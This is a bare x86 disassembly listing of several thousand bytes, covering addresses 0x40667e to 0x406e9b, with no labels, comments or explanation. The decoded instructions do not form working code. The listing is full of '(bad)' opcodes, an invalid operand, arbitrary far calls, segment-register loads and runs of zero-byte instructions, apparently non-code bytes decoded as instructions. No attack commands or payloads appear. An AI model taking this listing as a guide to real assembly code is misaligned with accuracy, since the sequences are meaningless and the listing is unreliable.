  40667e:	cmp    esi,edi
  406680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406681:	lods   al,BYTE PTR ds:[esi]
  406682:	and    dh,bh
  406684:	jle    0x406632
  406686:	push   cs
  406687:	sbb    DWORD PTR [esi-0x7b],eax
  40668a:	or     BYTE PTR [eax],bl
  40668c:	or     BYTE PTR ds:[eax],0xbb
  406690:	xchg   ecx,eax
  406691:	or     BYTE PTR [eax],0xba
  406694:	xchg   ecx,eax
  406695:	or     DWORD PTR [eax],0x87e91bd
  40669b:	mov    ah,0x91
  40669d:	jg     0x4066a7
  40669f:	lahf   
  4066a0:	add    BYTE PTR [eax],al
  4066a2:	add    BYTE PTR [eax],al
  4066a4:	add    BYTE PTR [ecx-0x6e69f784],dl
  4066aa:	jge    0x4066b4
  4066ac:	xchg   ecx,eax
  4066ad:	xchg   ecx,eax
  4066ae:	jp     0x4066b8
  4066b0:	nop
  4066b1:	xchg   ecx,eax
  4066b2:	jnp    0x4066bc
  4066b4:	ret    
  4066b5:	xchg   ecx,eax
  4066b6:	js     0x4066c0
  4066b8:	mov    DWORD PTR [ecx-0x6e77f78e],edx
  4066be:	jae    0x4066c8
  4066c0:	mov    edx,DWORD PTR [ecx-0x6e75f790]
  4066c6:	jno    0x4066d0
  4066c8:	test   DWORD PTR [ecx-0x6e73f792],edx
  4066ce:	outs   dx,DWORD PTR ds:[esi]
  4066cf:	or     BYTE PTR [edi+0x4e086c91],al
  4066d5:	xchg   ecx,eax
  4066d6:	ins    DWORD PTR es:[edi],dx
  4066d7:	or     BYTE PTR [ecx-0x6f],dl
  4066da:	push   0x8
  4066dc:	inc    eax
  4066dd:	xchg   ecx,eax
  4066de:	imul   ecx,DWORD PTR [eax],0x43
  4066e1:	xchg   ecx,eax
  4066e2:	push   0x69915208
  4066e7:	or     BYTE PTR [ebp-0x6f],cl
  4066ea:	data16 or BYTE PTR [ecx+edx*4+0x65],al
  4066ef:	or     BYTE PTR [edi],bh
  4066f1:	xchg   ecx,eax
  4066f2:	or     BYTE PTR fs:[esi],dl
  4066f5:	xchg   ecx,eax
  4066f6:	arpl   WORD PTR [eax],cx
  4066f8:	sbb    DWORD PTR [ecx-0x6ee7f79e],edx
  4066fe:	popa   
  4066ff:	or     BYTE PTR [ebx],bl
  406701:	xchg   ecx,eax
  406702:	pusha  
  406703:	or     BYTE PTR [eax],al
  406705:	enter  0x5eb4,0x4
  406709:	add    BYTE PTR [eax],al
  40670b:	add    BYTE PTR [eax],al
  40670d:	add    bl,bl
  40670f:	mov    ah,0x5b
  406711:	add    al,0xda
  406713:	mov    ah,0x5d
  406715:	add    al,0xd5
  406717:	mov    ah,0x5c
  406719:	add    al,0x4
  40671b:	mov    dh,0x59
  40671d:	add    al,0x17
  40671f:	mov    dh,0x5a
  406721:	add    al,0x16
  406723:	mov    dh,0x57
  406725:	add    al,0x11
  406727:	mov    dh,0x58
  406729:	add    al,0x0
  40672b:	mov    dh,0x55
  40672d:	add    al,0x23
  40672f:	mov    dh,0x56
  406731:	add    al,0x12
  406733:	mov    dh,0x53
  406735:	add    al,0x7d
  406737:	mov    ch,0x54
  406739:	add    al,0x5c
  40673b:	mov    ch,0x9d
  40673d:	add    al,0x5f
  40673f:	mov    ch,0x52
  406741:	add    al,0x4e
  406743:	mov    ch,0x4f
  406745:	add    al,0x39
  406747:	mov    ch,0x1a
  406749:	and    DWORD PTR [eax-0x74fbf14b],ebx
  40674f:	mov    ch,0xb
  406751:	add    al,0x8a
  406753:	mov    ch,0xd
  406755:	add    al,0x85
  406757:	mov    ch,0xc
  406759:	add    al,0x14
  40675b:	mov    dh,0x9
  40675d:	add    al,0x7
  40675f:	mov    dh,0xa
  406761:	add    al,0x6
  406763:	mov    dh,0x7
  406765:	add    al,0x1
  406767:	mov    dh,0x8
  406769:	add    al,0x10
  40676b:	mov    dh,0x5
  40676d:	add    al,0x13
  40676f:	mov    ch,0x6
  406771:	add    al,0x0
  406773:	add    BYTE PTR [eax],al
  406775:	add    BYTE PTR [eax],al
  406777:	add    dh,BYTE PTR [esi-0x4a12fbfd]
  40677d:	add    al,0x4
  40677f:	in     al,dx
  406780:	mov    ch,0x80
  406782:	add    al,0xcf
  406784:	mov    ch,0x2
  406786:	add    al,0x90
  406788:	pop    esp
  406789:	repz push cs
  40678b:	xchg   esp,eax
  40678c:	mov    ebx,esi
  40678e:	dec    ebp
  40678f:	mov    WORD PTR [edx-0x786bd00d],cs
  406795:	repz xor BYTE PTR [eax+ecx*4-0x726bba0d],cl
  40679d:	repz xor ecx,DWORD PTR [esi+eax*1+0xb9434f0]
  4067a5:	lock inc ebx
  4067a7:	mov    WORD PTR [eax+esi*8],es
  4067aa:	xor    dl,BYTE PTR [ecx+edx*1+0x28c44f0]
  4067b1:	lock aaa 
  4067b3:	xchg   esp,eax
  4067b4:	(bad)  
  4067b5:	out    dx,eax
  4067b6:	cmp    BYTE PTR [eax+edx*1+0x159439f0],cl
  4067bd:	lock cmp cl,BYTE PTR [esi+edi*8+0x3943bef]
  4067c5:	lock cmp al,0x8c
  4067c8:	or     al,0xf0
  4067ca:	cmp    eax,0x3eeff994
  4067cf:	mov    WORD PTR [edx],ds
  4067d1:	lock dec esi
  4067d3:	xchg   esp,eax
  4067d4:	pop    ss
  4067d5:	lock aas 
  4067d7:	mov    WORD PTR [eax],ds
  4067d9:	lock inc eax
  4067db:	add    BYTE PTR [eax],al
  4067dd:	add    BYTE PTR [eax],al
  4067df:	add    BYTE PTR [ebp+ebx*1+0x768c41f0],dl
  4067e6:	lock inc edx
  4067e8:	xchg   esp,eax
  4067e9:	jnp    0x4067db
  4067eb:	xor    eax,0x31f0748c
  4067f0:	xchg   esp,eax
  4067f1:	xor    eax,0xf0928c4b
  4067f7:	dec    edx
  4067f8:	xchg   esp,eax
  4067f9:	aad    0xf0
  4067fb:	ss mov esp,es
  4067fe:	lock inc edi
  406800:	xchg   esp,eax
  406801:	mov    edi,0xb28c4cf0
  406806:	dec    edx
  406807:	(bad)  
  406808:	fdiv   DWORD PTR [esi-0x493101d1]
  40680e:	cmp    dh,bh
  406810:	leave  
  406811:	mov    dh,0x5
  406813:	(bad)  
  406814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406815:	mov    dh,0x6
  406817:	(bad)  
  406818:	lahf   
  406819:	mov    dh,0x3
  40681b:	(bad)  
  40681c:	mov    al,ds:0x75fe04b6
  406821:	mov    dh,0x9
  406823:	(bad)  
  406824:	mov    ds:0x84fdc2b6,eax
  406829:	mov    dh,0xc7
  40682b:	std    
  40682c:	jae    0x4067e4
  40682e:	sar    ch,0x82
  406831:	mov    dh,0xcd
  406833:	std    
  406834:	ins    BYTE PTR es:[edi],dx
  406835:	mov    dh,0xde
  406837:	std    
  406838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406839:	mov    dh,0xdb
  40683b:	std    
  40683c:	test   al,0xb6
  40683e:	int3   
  40683f:	std    
  406840:	cdq    
  406841:	mov    dh,0xb1
  406843:	std    
  406844:	add    BYTE PTR [eax],al
  406846:	add    BYTE PTR [eax],al
  406848:	add    BYTE PTR [edx-0x7402654a],bl
  40684e:	mov    dh,0x7f
  406850:	std    
  406851:	test   BYTE PTR [esi-0x49820278],dh
  406857:	xchg   ebp,eax
  406858:	std    
  406859:	jbe    0x406811
  40685b:	jbe    0x40685a
  40685d:	jle    0x406815
  40685f:	jae    0x40685e
  406861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406862:	mov    dh,0x74
  406864:	std    
  406865:	jo     0x40681d
  406867:	jns    0x406866
  406869:	jno    0x406821
  40686b:	push   edx
  40686c:	std    
  40686d:	jb     0x406825
  40686f:	push   edi
  406870:	std    
  406871:	jge    0x406829
  406873:	push   eax
  406874:	std    
  406875:	xor    DWORD PTR [esi-0x499402a3],0xb6bafd4e
  40687f:	dec    ebx
  406880:	std    
  406881:	sahf   
  406882:	mov    dh,0xe
  406884:	xor    bh,BYTE PTR [ebp-0x27]
  406887:	or     ch,BYTE PTR ds:0x240ade75
  40688d:	ins    DWORD PTR es:[edi],dx
  40688e:	fimul  DWORD PTR [edx]
  406890:	pop    ds
  406891:	fmul   DWORD PTR gs:[edx]
  406894:	push   ss
  406895:	pop    ebp
  406896:	fisttp DWORD PTR [edx]
  406898:	dec    eax
  406899:	push   esp
  40689a:	aaa    
  40689b:	or     al,0x4b
  40689d:	dec    esp
  40689e:	cmp    DWORD PTR [edx+ecx*2],ecx
  4068a1:	inc    esp
  4068a2:	cmp    cl,BYTE PTR [ecx*2+0x440c3b3c]
  4068a9:	xor    al,0x5b
  4068ab:	or     al,0x8e
  4068ad:	add    BYTE PTR [eax],al
  4068af:	add    BYTE PTR [eax],al
  4068b1:	add    BYTE PTR [ebx-0x646ef3c2],bl
  4068b7:	inc    eax
  4068b8:	or     al,0x80
  4068ba:	mov    ebx,DWORD PTR [ebp+0xc]
  4068bd:	or     BYTE PTR [ebx-0x6468f3bf],0x37
  4068c4:	or     al,0x8e
  4068c6:	fwait
  4068c7:	(bad)  
  4068c8:	cs js  0x406856
  4068cb:	pop    esi
  4068cc:	or     al,0x7b
  4068ce:	mov    ebx,DWORD PTR [edi+0xc]
  4068d1:	pop    edx
  4068d2:	fwait
  4068d3:	pusha  
  4068d4:	or     al,0x55
  4068d6:	fwait
  4068d7:	popa   
  4068d8:	or     al,0x5c
  4068da:	mov    edi,DWORD PTR [esp+ecx*1+0x57]
  4068de:	mov    eax,DWORD PTR [edx+0xc]
  4068e1:	ds fwait
  4068e3:	jle    0x4068f1
  4068e5:	inc    ecx
  4068e6:	fwait
  4068e7:	jg     0x4068f5
  4068e9:	xor    BYTE PTR [ebx-0x74ccf383],cl
  4068ef:	bound  ecx,QWORD PTR [edx+eiz*4]
  4068f2:	fwait
  4068f3:	or     BYTE PTR [eax+ebp*1],0x9b
  4068f7:	inc    ebx
  4068f8:	or     al,0x2b
  4068fa:	mov    eax,DWORD PTR [esp+ecx*1+0x2a]
  4068fe:	mov    eax,DWORD PTR [ebp+0xc]
  406901:	add    BYTE PTR [ebp-0x53fc6545],bh
  406907:	mov    ebx,0xbbaf0399
  40690c:	cwde   
  40690d:	add    ebp,DWORD PTR [esi-0x5efc6845]
  406913:	mov    ebx,0x396
  406918:	add    BYTE PTR [eax],al
  40691a:	add    BYTE PTR [eax-0x4cfc6a45],ah
  406920:	mov    ebx,0xbbb20394
  406925:	xchg   ebx,eax
  406926:	add    eax,DWORD PTR [ebp+0x740392bb]
  40692c:	mov    ebx,0xbb770391
  406931:	nop
  406932:	add    edx,DWORD PTR [esi-0x16fc7045]
  406938:	mov    esp,0xbce803ae
  40693d:	lods   eax,DWORD PTR ds:[esi]
  40693e:	add    ebx,ebx
  406940:	mov    esp,0xbcdd03ab
  406945:	stos   BYTE PTR es:[edi],al
  406946:	add    ebp,DWORD PTR [edi*4-0x42e0fc57]
  40694d:	test   al,0x3
  40694f:	push   ds
  406950:	mov    ebp,0xbd2103a7
  406955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406956:	add    edx,eax
  406958:	mov    esp,0xbd1803a5
  40695d:	mov    ebp,0xbcbd0b03
  406962:	add    ecx,DWORD PTR [edx]
  406964:	mov    ebp,0xbd1d03bb
  406969:	mov    edx,0xb9bd0c03
  40696e:	add    ecx,DWORD PTR [edi]
  406970:	mov    ebp,0xbd0e03b8
  406975:	mov    bh,0x3
  406977:	inc    ecx
  406978:	mov    esp,0xbc4003b6
  40697d:	mov    ch,0x3
  40697f:	add    BYTE PTR [eax],al
  406981:	add    BYTE PTR [eax],al
  406983:	add    BYTE PTR [eax-0x6c45fb0d],dl
  406989:	hlt    
  40698a:	add    al,0xbb
  40698c:	xchg   ebx,eax
  40698d:	add    eax,0xfe93bc05
  406992:	add    al,0xbd
  406994:	xchg   ebx,eax
  406995:	test   DWORD PTR [esi+edi*4],0xbf04f093
  40699c:	xchg   ebx,eax
  40699d:	leave  
  40699e:	add    al,0xc0
  4069a0:	xchg   ebx,eax
  4069a1:	retf   0xc104
  4069a4:	xchg   ebx,eax
  4069a5:	retf   
  4069a6:	add    al,0xc3
  4069a8:	xchg   ebx,eax
  4069a9:	int3   
  4069aa:	add    al,0xc2
  4069ac:	xchg   ebx,eax
  4069ad:	lods   eax,DWORD PTR ds:[esi]
  4069ae:	push   es
  4069af:	les    edx,FWORD PTR [ebx-0x6c3af95a]
  4069b5:	scas   eax,DWORD PTR es:[edi]
  4069b6:	push   es
  4069b7:	(bad)  
  4069b8:	xchg   ebx,eax
  4069b9:	test   al,0x6
  4069bb:	(bad)  
  4069bc:	xchg   ebx,eax
  4069bd:	xchg   ecx,eax
  4069be:	push   es
  4069bf:	enter  0x9293,0x6
  4069c3:	leave  
  4069c4:	xchg   ebx,eax
  4069c5:	cmp    al,BYTE PTR [ebx]
  4069c7:	mov    bh,0x73
  4069c9:	cmp    eax,DWORD PTR [ebx]
  4069cb:	or     al,0xb5
  4069cd:	cmp    al,0x3
  4069cf:	add    BYTE PTR [ebp-0x4cdffccb],ch
  4069d5:	add    esp,DWORD PTR ds:[ecx]
  4069d8:	mov    bl,0x37
  4069da:	add    eax,DWORD PTR [edx]
  4069dc:	mov    ch,0x0
  4069de:	add    esp,DWORD PTR [ecx-0x5cfcfe4d]
  4069e4:	mov    bl,0xf2
  4069e6:	add    ah,BYTE PTR [eax+eax*1+0x0]
  4069ed:	mov    bl,0xf3
  4069ef:	add    ah,BYTE PTR [esi-0x64fcfb8d]
  4069f5:	jae    0x4069f4
  4069f7:	add    bl,BYTE PTR [ebp-0x61fd098d]
  4069fd:	jae    0x4069ee
  4069ff:	add    ah,BYTE PTR [eax+0xc98b273]
  406a05:	clc    
  406a06:	rcl    BYTE PTR [ebp-0x662d13f4],cl
  406a0c:	or     al,0x2c
  406a0e:	aam    0x82
  406a10:	or     al,0xf0
  406a12:	rol    BYTE PTR [edi+0x70d0ed0c],1
  406a18:	or     al,0xab
  406a1a:	shl    BYTE PTR ds:0x26d0bc0c,1
  406a20:	or     al,0x8d
  406a22:	shl    BYTE PTR [ebx],1
  406a24:	or     al,0x86
  406a26:	shr    BYTE PTR [edx],1
  406a28:	or     al,0x97
  406a2a:	shr    BYTE PTR ds:0x2ed0940c,1
  406a30:	or     al,0xd3
  406a32:	sar    BYTE PTR [edx],1
  406a34:	or     al,0x5c
  406a36:	aam    0x1f
  406a38:	or     al,0x62
  406a3a:	aam    0x28
  406a3c:	or     al,0xb1
  406a3e:	rcl    BYTE PTR [edi],1
  406a40:	or     al,0x8a
  406a42:	ror    bl,1
  406a44:	or     edx,DWORD PTR [edx]
  406a46:	ror    esp,1
  406a48:	or     edx,DWORD PTR [ebx]
  406a4a:	sar    DWORD PTR [ecx-0x5d2f96f5],1
  406a50:	or     eax,DWORD PTR [eax]
  406a52:	add    BYTE PTR [eax],al
  406a54:	add    BYTE PTR [eax],al
  406a56:	mov    edx,0xaf0ba7d0
  406a5b:	rcl    BYTE PTR [eax-0x372f57f5],1
  406a61:	or     edx,DWORD PTR [edx+0x20bb7d0]
  406a67:	mov    ah,0xac
  406a69:	or     eax,DWORD PTR [eax]
  406a6b:	aam    0x91
  406a6d:	or     eax,DWORD PTR [ecx]
  406a6f:	aam    0x9a
  406a71:	or     eax,DWORD PTR [edx]
  406a73:	aam    0x7f
  406a75:	or     esp,DWORD PTR [ebx]
  406a77:	aam    0xa8
  406a79:	or     dh,BYTE PTR [edx-0x2a]
  406a7c:	test   DWORD PTR [edx],ecx
  406a7e:	(bad)  
  406a7f:	xlat   BYTE PTR ds:[ebx]
  406a80:	push   cs
  406a81:	mov    BYTE PTR [edx-0x6574d5c0],cl
  406a87:	mov    ebx,0xbe9a4a2a
  406a8c:	sub    al,BYTE PTR [ebp-0x76]
  406a8f:	mov    edi,0xb88a4c2a
  406a94:	sub    al,BYTE PTR [ecx-0x66]
  406a97:	(bad)  
  406a98:	sub    dl,BYTE PTR [eax-0x66]
  406a9b:	mov    ecx,0xca8a532a
  406aa0:	sub    DWORD PTR [edx-0x76],eax
  406aa3:	ret    0x3d29
  406aa6:	call   0x29c6:0x9a1429be
  406aad:	jp     0x8a4694a1
  406ab3:	push   0x699a192c
  406ab8:	sub    al,0xf8
  406aba:	add    BYTE PTR [eax],al
  406abc:	add    BYTE PTR [eax],al
  406abe:	add    BYTE PTR [ecx-0x7604d64e],bl
  406ac4:	outs   dx,BYTE PTR ds:[esi]
  406ac5:	sub    al,0xfa
  406ac7:	mov    DWORD PTR [edi+0x2c],ebp
  406aca:	cmc    
  406acb:	cdq    
  406acc:	into   
  406acd:	sub    esp,ebx
  406acf:	xchg   ebp,eax
  406ad0:	(bad)  
  406ad1:	sub    edi,edx
  406ad3:	(bad)  
  406ad4:	out    0x29,al
  406ad6:	fiadd  WORD PTR [ebp-0x622ed622]
  406adc:	mov    al,0x29
  406ade:	mov    BYTE PTR [edx-0x7574d14f],bl
  406ae4:	mov    al,0x2e
  406ae6:	mov    cl,BYTE PTR [edx-0x657ad14a]
  406aec:	mov    bh,0x2e
  406aee:	dec    esp
  406aef:	call   0x2eba:0x8a472eb5
  406af6:	dec    esi
  406af7:	mov    bh,BYTE PTR [ebx-0x4765bed2]
  406afd:	add    BYTE PTR cs:[eax-0x48],ah
  406b01:	sbb    ah,BYTE PTR [eax]
  406b03:	arpl   WORD PTR [eax-0x47b2dfe5],di
  406b09:	sub    esp,DWORD PTR [edi+ebp*2]
  406b0c:	mov    eax,0xb7fe2028
  406b11:	sub    DWORD PTR [eax],esp
  406b13:	stc    
  406b14:	mov    bh,0x5b
  406b16:	and    eax,edi
  406b18:	mov    bh,0x5a
  406b1a:	and    DWORD PTR [ebx],ebp
  406b1c:	mov    ecx,0xb90a2159
  406b21:	pop    eax
  406b22:	and    DWORD PTR [eax],eax
  406b24:	add    BYTE PTR [eax],al
  406b26:	add    BYTE PTR [eax],al
  406b28:	add    eax,0xf42157b9
  406b2d:	mov    eax,0xb8e72156
  406b32:	push   ebp
  406b33:	and    esi,eax
  406b35:	mov    eax,0xb8f12154
  406b3a:	or     DWORD PTR [ecx],esp
  406b3c:	ret    0x1cb8
  406b3f:	and    ch,bl
  406b41:	mov    eax,0xb8cc2325
  406b46:	and    BYTE PTR [eax],al
  406b48:	jg     0x406b02
  406b4a:	and    al,0x23
  406b4c:	push   0xffffffb8
  406b4e:	push   ebx
  406b4f:	and    DWORD PTR [ebp-0x48],esi
  406b52:	push   edx
  406b53:	and    esp,esi
  406b55:	mov    ecx,0xb9f72151
  406b5a:	push   eax
  406b5b:	and    eax,esi
  406b5d:	mov    ecx,0xba33212c
  406b62:	sbb    esp,DWORD PTR [esi]
  406b64:	cmp    eax,0x2c25cdba
  406b69:	mov    edx,0xba2f25b7
  406b6e:	ret    
  406b6f:	and    eax,0x259fba0e
  406b74:	sub    DWORD PTR [edx-0x45e7dfea],edi
  406b7a:	adc    eax,0x6679020
  406b7f:	sbb    al,0x70
  406b81:	push   0x4d701d06
  406b86:	push   es
  406b87:	push   ds
  406b88:	jno    0x406bcd
  406b8a:	push   es
  406b8b:	xor    al,BYTE PTR [eax]
  406b8d:	add    BYTE PTR [eax],al
  406b8f:	add    BYTE PTR [eax],al
  406b91:	jo     0x406bdf
  406b93:	push   es
  406b94:	xor    esi,DWORD PTR [eax+0x42]
  406b97:	push   es
  406b98:	sbb    eax,0xac05f06f
  406b9d:	jne    0x406b8c
  406b9f:	add    eax,0x5e66dc0
  406ba4:	mov    dh,0xb5
  406ba6:	fild   DWORD PTR ds:0x5d4adcf
  406bac:	scas   al,BYTE PTR es:[edi]
  406bad:	mov    ch,0xf9
  406baf:	add    eax,0x5faade6
  406bb4:	stos   DWORD PTR es:[edi],eax
  406bb5:	mov    ch,0xf7
  406bb7:	add    eax,0x5b8adad
  406bbc:	mov    bl,0xb5
  406bbe:	mov    ch,0x5
  406bc0:	mov    ebp,0x605bead
  406bc5:	jbe    0x406b7a
  406bc7:	add    eax,0x5bc7022
  406bcc:	stos   BYTE PTR es:[edi],al
  406bcd:	jne    0x406b90
  406bcf:	add    eax,0x5b26db2
  406bd4:	mov    esp,0x1c05af75
  406bd9:	outs   dx,BYTE PTR ds:[esi]
  406bda:	add    BYTE PTR ds:0x57d761e,0x63
  406be1:	outs   dx,BYTE PTR ds:[esi]
  406be2:	jbe    0x406be9
  406be4:	data16 mov dh,0x6b
  406be7:	add    eax,0x569ae65
  406bec:	and    BYTE PTR [edi-0x4fdffa96],dh
  406bf2:	addr16 add eax,0x21
  406bf8:	add    BYTE PTR [eax],al
  406bfa:	mov    al,0x68
  406bfc:	add    eax,0x91b2af13
  406c01:	or     al,BYTE PTR [edi+0x670a9ad3]
  406c07:	aam    0x8f
  406c09:	or     bh,BYTE PTR ds:0x520a98d4
  406c0f:	aam    0x8d
  406c11:	or     dl,BYTE PTR [eax-0x2c]
  406c14:	mov    cs,WORD PTR [edx]
  406c16:	xchg   ah,dl
  406c18:	jnp    0x406c24
  406c1a:	test   edi,ecx
  406c1c:	jl     0x406c28
  406c1e:	jg     0x406bf1
  406c20:	imul   ecx,DWORD PTR [edx],0xa52d258
  406c26:	jp     0x406bfa
  406c28:	push   edi
  406c29:	or     ch,BYTE PTR [esi-0x3bf67b2e]
  406c2f:	mov    dl,0x7f
  406c31:	or     DWORD PTR [esi-0x57f6624e],edi
  406c37:	aam    0x8e
  406c39:	or     DWORD PTR [edi+0x370925d4],esi
  406c3f:	mov    bl,0x23
  406c41:	or     DWORD PTR ds:0xa90924d5,esi
  406c47:	aam    0x21
  406c49:	or     DWORD PTR [edx-0x18f6d82b],ebx
  406c4f:	mov    dl,0x3b
  406c51:	or     DWORD PTR [eax+0x1d0921d4],ebx
  406c57:	(bad)  
  406c58:	daa    
  406c59:	or     esp,esi
  406c5b:	aam    0x10
  406c5d:	or     DWORD PTR [eax],eax
  406c5f:	add    BYTE PTR [eax],al
  406c61:	add    BYTE PTR [eax],al
  406c63:	pop    ebx
  406c64:	shl    BYTE PTR [eax+ecx*1+0x8b7d588],1
  406c6b:	push   0xffffffd4
  406c6d:	mov    ebp,0xbbd51308
  406c72:	or     BYTE PTR [edx],dl
  406c74:	aad    0xa9
  406c76:	or     BYTE PTR [edx],dh
  406c78:	aad    0xb1
  406c7a:	or     BYTE PTR [ebx],dh
  406c7c:	aad    0xe
  406c7e:	xchg   esi,eax
  406c7f:	lahf   
  406c80:	shr    DWORD PTR [esi],0xc9
  406c83:	xchg   edi,eax
  406c84:	or     BYTE PTR [edx],0x88
  406c87:	pop    DWORD PTR [ebx-0x7b7874f6]
  406c8d:	or     cl,BYTE PTR [edx-0x7af57a61]
  406c93:	xchg   edi,eax
  406c94:	jle    0x406ca0
  406c96:	mov    WORD PTR [edi-0x7878f581],cs
  406c9c:	or     BYTE PTR [edx],0x8e
  406c9f:	lahf   
  406ca0:	or     DWORD PTR [edx],0xa8a9781
  406ca6:	push   eax
  406ca7:	(bad)  
  406ca8:	mov    ecx,DWORD PTR [edx]
  406caa:	push   ebx
  406cab:	xchg   DWORD PTR [edx+ecx*1+0xa8d9f42],ecx
  406cb2:	cmp    eax,0x540a8697
  406cb7:	pop    DWORD PTR [edi-0x7778b0f6]
  406cbd:	or     al,BYTE PTR [esi-0x61]
  406cc0:	mov    DWORD PTR [edx],ecx
  406cc2:	cmp    DWORD PTR [edi+0x180a92],edx
  406cc8:	add    BYTE PTR [eax],al
  406cca:	add    BYTE PTR [eax],al
  406ccc:	(bad)  
  406ccd:	xchg   ebx,eax
  406cce:	or     bl,BYTE PTR [ebx]
  406cd0:	xchg   DWORD PTR [edx+ecx*1+0xa959f1a],edx
  406cd7:	adc    eax,0xfc0a8e97
  406cdc:	mov    cs,WORD PTR [edi-0x6f7908f6]
  406ce2:	or     bh,dh
  406ce4:	sahf   
  406ce5:	xchg   ecx,eax
  406ce6:	or     dh,cl
  406ce8:	xchg   esi,eax
  406ce9:	call   0xe30a:0x9b88e00a
  406cf0:	mov    BYTE PTR [edx+ecx*1+0xb39988],bl
  406cf7:	mov    ebx,DWORD PTR [ecx+0xa0000b4]
  406cfd:	mov    ebx,0xbb0d0e0b
  406d02:	or     cl,BYTE PTR [esi]
  406d04:	sbb    al,0xbb
  406d06:	or     DWORD PTR [esi],ecx
  406d08:	btc    DWORD PTR [eax],ecx
  406d0b:	push   cs
  406d0c:	dec    esi
  406d0d:	mov    ebx,0xbb410e07
  406d12:	push   es
  406d13:	push   cs
  406d14:	push   eax
  406d15:	mov    ebx,0xbb530e05
  406d1a:	add    al,0xe
  406d1c:	bound  edi,QWORD PTR [ebx-0x44baf1fd]
  406d22:	add    cl,BYTE PTR [esi]
  406d24:	push   esp
  406d25:	mov    ebx,0xbb670e01
  406d2a:	add    BYTE PTR [esi],cl
  406d2c:	push   es
  406d2d:	mov    ebx,0xdff
  406d32:	add    BYTE PTR [eax],al
  406d34:	add    cl,bh
  406d36:	mov    edx,0xba280e1e
  406d3b:	sbb    eax,0x1cba2b0e
  406d40:	push   cs
  406d41:	cli    
  406d42:	mov    ecx,0xb9fd0e1b
  406d47:	sbb    cl,BYTE PTR [esi]
  406d49:	in     al,dx
  406d4a:	mov    ecx,0xb9df0e19
  406d4f:	sbb    BYTE PTR [esi],cl
  406d51:	mov    esi,0xf10e17b9
  406d56:	mov    ecx,0xb9e00e16
  406d5b:	adc    eax,0x14b9e30e
  406d60:	push   cs
  406d61:	sar    BYTE PTR [ecx-0x468af1ed],cl
  406d67:	adc    cl,BYTE PTR [esi]
  406d69:	fs mov ecx,0xb9770e11
  406d6f:	adc    BYTE PTR [esi],cl
  406d71:	idiv   BYTE PTR [edx-0x4516f1f1]
  406d77:	cs push cs
  406d79:	nop
  406d7a:	pop    edx
  406d7b:	pop    es
  406d7c:	and    DWORD PTR [esi-0x71ddf8a5],edx
  406d82:	pop    esp
  406d83:	pop    es
  406d84:	and    eax,DWORD PTR [esi-0x61dbf8b3]
  406d8a:	push   esi
  406d8b:	pop    es
  406d8c:	and    eax,0x26074f96
  406d91:	mov    ds,WORD PTR [eax+0x7]
  406d94:	daa    
  406d95:	xchg   BYTE PTR [ecx+0x7],ah
  406d98:	sub    BYTE PTR [eax],al
  406d9a:	add    BYTE PTR [eax],al
  406d9c:	add    BYTE PTR [eax],al
  406d9e:	sahf   
  406d9f:	push   edx
  406da0:	pop    es
  406da1:	sub    DWORD PTR [esi-0x71d5f8ad],edx
  406da7:	fs pop es
  406da9:	sub    eax,DWORD PTR [esi-0x61d3f8ab]
  406daf:	dec    esi
  406db0:	pop    es
  406db1:	sub    eax,0x2e074796
  406db6:	mov    fs,eax
  406db8:	push   es
  406db9:	das    
  406dba:	xchg   cl,ch
  406dbc:	push   es
  406dbd:	xor    BYTE PTR [esi-0x69cef916],bl
  406dc3:	jmp    0x406dcb
  406dc5:	xor    cl,BYTE PTR [esi-0x79ccf934]
  406dcb:	mov    ebp,0xc69e3406
  406dd0:	push   es
  406dd1:	xor    eax,0x3606bf96
  406dd6:	mov    gs,eax
  406dd8:	push   es
  406dd9:	aaa    
  406dda:	xchg   cl,dh
  406ddc:	push   es
  406ddd:	cmp    BYTE PTR [esi-0x69c6f91e],bl
  406de3:	jecxz  0x406deb
  406de5:	cmp    cl,BYTE PTR [esi-0x79c1f931]
  406deb:	enter  0x3f06,0x9e
  406def:	mov    ecx,0xba964006
  406df4:	push   es
  406df5:	inc    ecx
  406df6:	mov    ?,WORD PTR [edx-0x472df83d]
  406dfc:	les    eax,FWORD PTR [edi]
  406dfe:	push   ebx
  406dff:	mov    eax,0x7c1
  406e04:	add    BYTE PTR [eax],al
  406e06:	add    BYTE PTR [eax+edi*4-0x36],cl
  406e0a:	pop    es
  406e0b:	push   ebp
  406e0c:	mov    eax,0xb84e07bf
  406e11:	enter  0x5707,0xb8
  406e15:	int    0x7
  406e17:	pop    eax
  406e18:	mov    eax,0xb84907ce
  406e1d:	fwait
  406e1e:	pop    es
  406e1f:	dec    edx
  406e20:	mov    eax,0xb85b079c
  406e25:	mov    DWORD PTR [edi],eax
  406e27:	push   esp
  406e28:	mov    eax,0xb84d0772
  406e2d:	jne    0x406e36
  406e2f:	pusha  
  406e30:	mov    eax,0xb8410776
  406e35:	jae    0x406e3e
  406e37:	inc    edx
  406e38:	mov    eax,0xb8430774
  406e3d:	push   ecx
  406e3e:	pop    es
  406e3f:	cmp    al,0xb8
  406e41:	pop    edx
  406e42:	pop    es
  406e43:	in     eax,0xb4
  406e45:	dec    edi
  406e46:	pop    es
  406e47:	fidiv  WORD PTR [eax+ebx*2+0x4db4e707]
  406e4e:	pop    es
  406e4f:	fdiv   DWORD PTR [esi+ecx*2-0x794b36f9]
  406e56:	or     ah,BYTE PTR [ecx-0x5df57c1d]
  406e5c:	jecxz  0x406ea2
  406e5e:	or     ah,BYTE PTR [ebx-0x7bf5b61d]
  406e64:	jecxz  0x406ea8
  406e66:	or     bh,BYTE PTR [ebp-0x1d]
  406e69:	inc    edi
  406e6a:	or     al,BYTE PTR [eax]
  406e6c:	add    BYTE PTR [eax],al
  406e6e:	add    BYTE PTR [eax],al
  406e70:	xchg   bl,ah
  406e72:	inc    eax
  406e73:	or     bh,BYTE PTR [edi-0x1d]
  406e76:	pop    ebp
  406e77:	or     ch,BYTE PTR [eax-0x1d]
  406e7a:	push   cs
  406e7b:	inc    eax
  406e7c:	call   0x3de8:0x8a433deb
  406e83:	xchg   edx,eax
  406e84:	mov    ecx,ebp
  406e86:	cmp    eax,0x3de6998d
  406e8b:	test   BYTE PTR [ecx-0x7680c219],bl
  406e91:	in     al,0x3d
  406e93:	xchg   esi,eax
  406e94:	mov    ebp,esp
  406e96:	cmp    eax,0x3df29979
  406e9b:	js     0x406e36
